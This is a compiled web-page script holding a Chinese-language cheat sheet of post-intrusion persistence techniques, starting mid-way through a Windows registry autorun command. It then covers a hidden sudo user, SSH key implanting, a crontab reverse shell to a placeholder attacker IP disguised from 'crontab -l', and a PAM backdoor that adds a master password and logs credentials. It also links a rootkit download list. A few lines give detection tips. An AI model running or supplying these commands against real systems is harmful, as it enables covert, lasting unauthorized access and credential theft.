"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("add")]),s._v(" HKEY_CURRENT_USER"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SOFTWARE"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Microsoft"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Windows"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("CurrentVersion"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Run /v SunRAC /t reg_sz /d "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"C:\\Users\\Public\\Downloads\\msservice.exe"')]),s._v(" \n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"linux"}},[s._v("Linux "),a("a",{staticClass:"header-anchor",attrs:{href:"#linux"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("增加超级用户账号")])]),s._v(" "),a("blockquote",[a("p",[a("strong",[s._v("如果系统不允许"),a("code",[s._v("uid=0")]),s._v("的用户（"),a("code",[s._v("root")]),s._v("）远程登录，可以添加一个普通用户，并将其加入sudoers")])])]),s._v(" "),a("p",[a("strong",[s._v("增加用户")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("useradd")]),s._v(" phP\t\t\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" @admin.886"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("passwd")]),s._v(" --stdin phP\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#添加账户")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#设置密码(密码符合要密码强度策略)")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("修改sudoers赋予sudo权限")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" +w /etc/sudoers    \n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"phP ALL=(ALL) ALL"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">>")]),s._v(" /etc/sudoers\t\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" -w /etc/sudoers\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#赋予写入权限")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#添加sudo用户")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#撤销写入权限")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("或者还可以修改/etc/passwd文件，把用户uid改为0。")]),s._v(" "),a("p",[a("strong",[s._v("SSH公钥无密码登录")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("ssh-keygen -t rsa    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#本机生成rsa公钥")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#把id_rsa.pub写入服务端的authorized_keys中")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("600")]),s._v(" ~/.ssh/authorized_keys\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("chmod")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("700")]),s._v(" ~/.ssh\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"id_rsa.pub的内容"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" ~/.ssh/authorized_keys\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#没有这个文件的话，就自己创建一个")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" ~/\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" .ssh\n"),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v(" .ssh\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("touch")]),s._v(" authorized_keys\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("p",[a("strong",[s._v("Crontab定时反弹shell")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("crontab -l"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("printf")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"*/1 * * * * exec 9<> /dev/tcp/攻击者IP/8888;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;'),a("span",{pre:!0,attrs:{class:"token entity",title:"\\r"}},[s._v("\\r")]),s._v("no crontab for "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("`")])]),s._v("%100c"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("crontab")]),s._v(" -\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#每分钟执行一次，并且crontab -l看不出来")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#这种要用crontab -e 进去查看并编辑才能看到")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("strong",[s._v("PAM后门")])]),s._v(" "),a("blockquote",[a("p",[s._v("**PAM （Pluggable Authentication Modules ）**是由Sun提出的一种认证机制。")]),s._v(" "),a("p",[s._v("它通过提供一些动态链接库和一套统一的API，将系统提供的服务和该服务的认证方式分开")]),s._v(" "),a("p",[s._v("使得系统管理员可以灵活地根据需要给不同的服务配置不同的认证方式，而无需更改服务程序")]),s._v(" "),a("p",[s._v("同时也便于向系统中添加新的认证手段")])]),s._v(" "),a("p",[a("strong",[s._v("步骤：")])]),s._v(" "),a("p",[s._v("1、获取目标系统所使用的PAM版本，下载对应版本的pam版本")]),s._v(" "),a("p",[s._v("2、解压缩，修改pam_unix_auth.c文件，添加万能密码")]),s._v(" "),a("p",[s._v("3、编译安装PAM")]),s._v(" "),a("p",[s._v("4、编译完后的文件在：modules/pam_unix/.libs/pam_unix.so，复制到/lib64/security中进行替换")]),s._v(" "),a("p",[s._v("​\t\t即可使用万能密码登陆，并将用户名密码记录到文件中")]),s._v(" "),a("p",[a("strong",[s._v("排查PAM后门技巧：")])]),s._v(" "),a("p",[s._v("1、通过Strace跟踪ssh")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ps")]),s._v(" axu "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" sshd\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("strace")]),s._v(" -o aa -ff -p PID\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v(" aa* "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" -v -e No -e null -e denied"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" WR\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("2、检查pam_unix.so的修改时间")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("stat")]),s._v(" /lib/security/pam_unix.so      "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#32位")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("stat")]),s._v(" /lib64/security/pam_unix.so    "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#64位")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("Rootkit工具包")])]),s._v(" "),a("blockquote",[a("p",[s._v("rootkit是一种特殊的恶意软件。三要素是："),a("strong",[s._v("隐藏、操纵、收集数据")]),s._v("。")]),s._v(" "),a("p",[s._v("功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息")]),s._v(" "),a("p",[s._v("多见的rootkit一般都是木马、后门和其它恶意程序结合使用")]),s._v(" "),a("p",[a("strong",[s._v("Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的")])]),s._v(" "),a("p",[s._v("Rootkit是攻击者用来隐藏自己的踪迹和保留root访问权限的工具")])]),s._v(" "),a("p",[a("strong",[s._v("Rootkit类型")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("固件Rootkit\n虚拟化Rootkit\n内核级Rootkit\n库级Rootkit\n应用级Rootkit\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("Rootkit工具包列表")]),s._v("：https://github.com/d30sa1/RootKits-List-Download  （注意与"),a("code",[s._v("Centos")]),s._v("版本适配）")]),s._v(" "),a("p",[a("strong",[s._v("检测与防护：")])]),s._v(" "),a("p",[s._v("rkhunter：http://rkhunter.sourceforge.net/")]),s._v(" "),a("p",[s._v("chkrootkit：http://www.chkrootkit.org/download/")]),s._v(" "),a("p",[s._v("定期检查md5，对于找出的 Rootkit，最好的应对方法是擦除并重新安装系统")])])}),[],!1,null,null,null);t.default=e.exports}}]);